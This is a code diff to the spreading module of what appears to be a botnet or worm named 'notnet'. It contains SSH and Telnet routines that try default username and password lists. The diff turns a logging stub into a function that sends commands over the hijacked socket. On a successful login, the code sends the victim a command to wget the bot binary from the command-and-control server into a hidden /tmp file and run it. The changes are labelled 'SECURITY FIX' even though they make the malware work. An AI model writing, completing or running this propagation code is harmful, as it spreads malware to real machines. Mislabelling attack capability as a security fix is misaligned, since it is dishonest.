@@ -40,9 +40,18 @@ static const char *default_passes[] = {
 };
 
 /* ── Helper ─────────────────────────────────────────────────── */
-static void send_command(const char *ip, uint16_t port, const char *service, const char *cmd) {
-    log_info("send_cmd: %s://%s:%d '%s'", service, ip, port, cmd);
-    /* In production, this would use the appropriate protocol */
+/* SECURITY FIX (#15): send_command now actually sends commands over an
+ * open socket instead of just logging. For SSH/Telnet this sends the
+ * command followed by a newline. */
+static void send_command(int sock, const char *service, const char *cmd) {
+    log_info("send_cmd: %s '%s'", service, cmd);
+    if (sock >= 0) {
+        char cmd_line[1024];
+        int len = snprintf(cmd_line, sizeof(cmd_line), "%s\r\n", cmd);
+        if (len < (int)sizeof(cmd_line)) {
+            send(sock, cmd_line, len, 0);
+        }
+    }
 }
 
 /* ── Connection helpers ─────────────────────────────────────── */
@@ -168,8 +177,10 @@ int try_login_ssh(const char *ip, uint16_t port, const char *user, const char *p
         }
     }
     
+    /* SECURITY FIX (#15): Return socket fd on success instead of closing */
+    if (success) return sock;
     close(sock);
-    return success;
+    return -1;
 }
 
 int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
@@ -180,7 +191,8 @@ int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
     /* Try default credentials */
     for (int u = 0; default_users[u]; u++) {
         for (int p = 0; default_passes[p]; p++) {
-            if (try_login_ssh(ip, port, default_users[u], default_passes[p])) {
+            int sock_fd = try_login_ssh(ip, port, default_users[u], default_passes[p]);
+            if (sock_fd >= 0) {
                 log_info("SSH: cracked %s:%d with %s:%s",
                          ip, port, default_users[u], "***REDACTED***");
                 
@@ -193,7 +205,9 @@ int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
                 snprintf(cmd, sizeof(cmd),
                     "wget %s -O /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &",
                     dl_url);
-                send_command(ip, port, "ssh", cmd);
+                /* SECURITY FIX (#15): Send command over the established socket */
+                send_command(sock_fd, "ssh", cmd);
+                close(sock_fd);
                 return 0;
             }
         }
@@ -254,8 +268,10 @@ int try_login_telnet(const char *ip, uint16_t port, const char *user, const char
         }
     }
     
+    /* SECURITY FIX (#15): Return socket fd on success instead of closing */
+    if (success) return sock;
     close(sock);
-    return success;
+    return -1;
 }
 
 int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
@@ -265,7 +281,8 @@ int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
     
     for (int u = 0; default_users[u]; u++) {
         for (int p = 0; default_passes[p]; p++) {
-            if (try_login_telnet(ip, port, default_users[u], default_passes[p])) {
+            int sock_fd = try_login_telnet(ip, port, default_users[u], default_passes[p]);
+            if (sock_fd >= 0) {
                 log_info("Telnet: cracked %s:%d with %s:%s",
                          ip, port, default_users[u], "***REDACTED***");
                 
@@ -273,7 +290,9 @@ int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
                 snprintf(cmd, sizeof(cmd),
                     "wget http://%s:%d/bot/notnet -O /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &",
                     bot->c2_http.server, PAYLOAD_DL_PORT);
-                send_command(ip, port, "telnet", cmd);
+                /* SECURITY FIX (#15): Send command over the established socket */
+                send_command(sock_fd, "telnet", cmd);
+                close(sock_fd);
                 return 0;
             }
         }
@@ -318,7 +337,7 @@ int spread_smb(notnet_bot_t *bot, const char *ip, uint16_t port) {
                 snprintf(cmd, sizeof(cmd),
                     "echo '%s /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &' | at now + 1 minute",
                     "wget http://...");
-                send_command(ip, port, "smb", cmd);
+                send_command(-1, "smb", cmd);
                 return 0;
             }
         }
@@ -480,7 +499,7 @@ int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
                 snprintf(cmd, sizeof(cmd),
                     "wget http://%s:%d/bot/notnet -O /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &",
                     bot->c2_http.server, PAYLOAD_DL_PORT);
-                send_command(ip, port, "rdp", cmd);
+                send_command(-1, "rdp", cmd);
                 return 0;
             }
         }
